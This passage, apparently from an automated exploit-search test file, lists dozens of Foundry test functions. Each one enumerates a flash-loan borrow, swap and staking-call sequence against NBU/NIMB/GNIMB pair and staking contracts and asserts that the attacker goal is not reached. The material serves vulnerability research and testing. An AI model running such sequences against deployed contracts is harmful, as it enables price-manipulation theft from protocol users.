    }

    function check_cand3190(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3191(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3192(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3193(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3194(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3195(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3196(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3197(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3198(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3199(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3200(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3201(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3202(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3203(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3204(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3205(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3206(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3207(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3208(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3209(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3210(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3211(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3212(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3213(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3214(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3215(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3216(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3217(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3218(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3219(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3220(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3221(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3222(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3223(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3224(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3225(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3226(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3227(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3228(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3229(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3230(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3231(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3232(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3233(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3234(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3235(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3236(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
